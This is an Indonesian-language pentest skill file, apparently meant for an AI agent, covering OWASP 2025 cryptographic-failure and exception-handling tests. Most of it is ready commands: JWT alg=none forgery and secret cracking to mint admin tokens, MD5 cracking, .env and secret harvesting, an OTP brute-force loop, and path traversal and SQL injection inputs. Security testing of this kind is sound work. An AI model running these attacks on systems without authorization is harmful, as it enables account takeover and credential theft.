---
name: hunt-cryptofails
description: "Hunt Cryptographic Failures (OWASP A04:2025) dan Mishandling of Exceptional Conditions (OWASP A10:2025) — dua kategori baru/naik peringkat di OWASP 2025. Covers: weak JWT, insecure hashing, TLS misconfiguration, sensitive data in transit, exposed API keys di JS bundle, weak random/predictable tokens, dan error paths yang bocorkan data. Gunakan saat testing website yang handle data sensitif, payment, atau autentikasi."
version: 1.0.0
sources: owasp-top10-2025, turingpoint.de, orca-security
---

# Hunt: Cryptographic Failures + Exception Handling (OWASP 2025)

> OWASP A04:2025 — Cryptographic Failures (naik dari #2 2021)
> OWASP A10:2025 — Mishandling of Exceptional Conditions (BARU di 2025)
> "Attackers love exceptional paths — under-tested dan sering inconsistent"

---

## BAGIAN 1: Cryptographic Failures (A04:2025)

### 1A — JWT Lemah

```bash
# Step 1: Decode JWT (tanpa verifikasi)
echo "eyJhbGc..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Step 2: Cek algorithm di header
# BAHAYA jika: "alg": "none", "alg": "HS256" (bisa brute force)

# Step 3: Test alg=none (bypass signature)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"user_id":1,"role":"admin"}
# Signature: (kosong)
# Token: base64(header).base64(payload).

# Step 4: Brute force HMAC secret jika HS256
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# Tool: jwt_tool
python3 jwt_tool.py TOKEN -X a      # Test alg=none
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # Crack

# Jika punya secret → forge token dengan role: admin
python3 jwt_tool.py TOKEN -T -S hs256 -p "secret_lemah"
```

### 1B — Password Hashing Lemah

```bash
# Cek algoritma hash yang dipakai
# Jika bisa dapat hash dari leak atau error:
# MD5 (32 hex) = SANGAT lemah, bisa crack instant
# SHA1 (40 hex) = lemah
# bcrypt ($2b$) = aman
# argon2 = aman

# Identify hash
hashid "5f4dcc3b5aa765d61d8327deb882cf99"  # → MD5

# Crack MD5
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
john --format=raw-md5 hash.txt

# Test via forgot password
# Jika reset link mengandung: ?token=MD5(email) atau ?token=timestamp
# Itu predictable!
```

### 1C — Data Sensitif Tidak Dienkripsi / Bocor

```bash
# Cek apakah data sensitif ada di URL (masuk log server)
# SALAH: GET /reset?token=abc&email=user@email.com
# SALAH: GET /login?password=abc123

# Cek response header
curl -I https://target.com
# Harus ada: Strict-Transport-Security, Secure flag pada cookie

# Cek cookie tanpa Secure/HttpOnly flag
# DevTools → Application → Cookies
# Cookie auth tanpa HttpOnly → bisa dicuri via XSS
# Cookie auth tanpa Secure → bocor via HTTP

# Test apakah berjalan di HTTP (bukan HTTPS)
curl http://target.com  # redirect ke HTTPS?
# Jika tidak redirect → data bisa disadap

# SSL/TLS test
nmap --script ssl-enum-ciphers -p 443 target.com
# Cari: SSLv2, SSLv3, TLSv1.0, TLSv1.1 → deprecated, lemah
```

### 1D — API Key Exposed di Frontend

```bash
# Cari API key di JavaScript bundle
curl https://target.com | grep -oE "sk-[a-zA-Z0-9]{48}"
curl https://target.com/static/js/main.js | grep -oE "(api_key|apiKey|API_KEY)\s*[:=]\s*['\"][^'\"]{10,}"

# Cari di source HTML
view-source:https://target.com
# Ctrl+F: api, key, secret, token, password, credential

# Cek file yang sering bocorkan credential
curl https://target.com/.env
curl https://target.com/config.js
curl https://target.com/app.js
curl https://target.com/main.bundle.js | grep -i "secret\|apikey\|password"

# Tools otomatis
# SecretFinder
python3 SecretFinder.py -i https://target.com/main.js -o cli

# truffleHog untuk website
trufflehog filesystem /path/ke/download-website
```

### 1E — Token/OTP Predictable

```bash
# Test predictability reset password token
# Minta reset 3x berturut-turut, compare token:
# Token 1: abc123def456
# Token 2: abc123def457
# Token 3: abc123def458
# → Token incremental = predictable!

# Test OTP 6 digit lemah
# Jika tidak ada rate limiting → brute force 000000-999999
for i in $(seq -w 0 999999); do
  curl -X POST /api/verify-otp -d "{\"otp\":\"$i\"}" 
  sleep 0.1
done

# Test apakah token OTP tidak expired
# Minta OTP → tunggu 1 jam → coba pakai → masih bisa?
```

---

## BAGIAN 2: Mishandling of Exceptional Conditions (A10:2025)

### 2A — Stack Trace Bocor

```bash
# Trigger berbagai jenis error
curl /api/users/99999999999999    # ID sangat besar
curl /api/users/../../../../etc   # Path traversal
curl /api/search?q[]=array        # Type mismatch
curl /api/payment -d '{"amount":null}'
curl /api/login -d '{invalid json'

# Kirim Content-Type salah
curl /api/json-endpoint -H "Content-Type: text/xml" -d "<xml/>"

# Trigger database error
curl /api/users?sort=INVALID_COLUMN
curl "/api/search?q='; SELECT sleep(5)--"

# Yang dicari di response:
# - Path file server (/var/www/html/..., C:\inetpub\...)
# - Nama library + versi (Laravel 9.x, Express 4.18.x)
# - Query SQL yang gagal
# - Connection string DB (mysql://user:pass@host/db)
# - Stack trace dengan line number
```

### 2B — Bypass Logic via Exception Path

```bash
# Cek apakah error path melewati auth check
# Normal: GET /api/invoice/1 → 401 Unauthorized
# Exception: GET /api/invoice/null → 200 OK dengan data??

# Test dengan berbagai nilai aneh
curl /api/resource/0
curl /api/resource/-1
curl /api/resource/undefined
curl /api/resource/NaN
curl /api/resource/Infinity

# Test boundary conditions
curl /api/transfer -d '{"amount": 0}'
curl /api/transfer -d '{"amount": -100}'
curl /api/transfer -d '{"amount": 99999999999}'
curl /api/transfer -d '{"amount": 1e308}'

# Race condition pada error path
# Kirim request yang akan gagal bersamaan dengan yang sukses
# Contoh: transfer dana persis saat balance 0
```

### 2C — Partial Transaction / Inconsistent State

```bash
# Test apakah error di tengah proses menyebabkan state inconsistent
# Contoh: proses order
# Step 1: kurangi stok ✓
# Step 2: proses payment → ERROR
# Step 3: stok berkurang tapi order tidak jadi → bug!

# Cara test:
# 1. Mulai transaksi multi-step
# 2. Putus koneksi di tengah (kill request di Burp)
# 3. Cek apakah state konsisten

# Test dengan nilai yang trigger floating point error
curl /api/split-payment -d '{"amount": 0.1, "ways": 3}'
# 0.1 / 3 = 0.033333... → floating point issue
```

---

## Checklist Hunt Crypto + Exception

```
[ ] Decode semua JWT — cek alg header
[ ] Test JWT alg=none bypass
[ ] Brute force JWT jika alg=HS256
[ ] Cari API key di JS bundle dan source HTML
[ ] Test semua halaman di HTTP (bukan HTTPS)
[ ] Cek cookie: ada Secure + HttpOnly flag?
[ ] Minta reset password 3x — apakah token predictable?
[ ] Test OTP brute force — ada rate limiting?
[ ] Trigger error dengan input aneh di semua endpoint
[ ] Cek apakah stack trace bocor ke response
[ ] Test nilai ekstrem: null, undefined, -1, 0, sangat besar
[ ] Test error path bypass auth logic
[ ] Test partial transaction / race condition di transaksi kritis
[ ] Scan SSL/TLS config — ada TLS 1.0/1.1?
```
